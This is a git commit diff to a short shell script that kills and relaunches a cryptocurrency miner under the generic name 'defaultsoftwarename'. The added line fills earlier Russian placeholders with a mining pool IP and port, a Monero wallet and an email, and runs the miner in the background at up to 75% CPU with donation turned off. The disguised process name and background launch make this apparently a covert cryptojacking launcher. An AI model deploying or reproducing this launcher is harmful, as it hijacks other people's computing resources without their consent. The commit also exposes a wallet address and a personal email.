caadc90236ca01b80fcc95086e213f1005746abf
whatislove0 <58768273+whatislove0@users.noreply.github.com>
2019-12-13 00:11:32 +0200

    Update 2.sh

--- 2.sh
+++ 2.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
+defaultsoftwarename -o 51.89.203.217:49228 -u 46Dce8YRBM8S63kk8ZnpW6JdCh5Sdkkgc5SnhamJfAGFPsjaN848TowX43NTHRg3YEcwFGs3QC276X8gyw9zf3Y1U5CbXfP --pass=x:whatislove@tuta.io --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
